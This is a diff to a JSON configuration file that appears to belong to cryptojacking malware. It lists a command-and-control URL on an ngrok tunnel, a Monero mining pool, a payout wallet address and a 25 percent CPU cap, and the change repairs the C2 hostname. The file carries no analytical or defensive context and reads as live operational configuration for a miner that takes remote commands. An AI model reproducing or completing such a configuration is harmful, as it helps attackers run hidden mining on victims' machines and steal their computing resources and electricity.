@@ -1,7 +1,7 @@
 {
-  "c2_url": "https://lynelle-scroddled-corinne.ngrok-free-dev.ngrok-app.com",
+  "c2_url": "https://lynelle-scroddled-corinne.ngrok-free.dev",
   "pool": "pool.hashvault.pro:80",
   "wallet": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
   "cpu_limit": 25,
-  "updated": 1774618130
+  "updated": 1774618510
 }
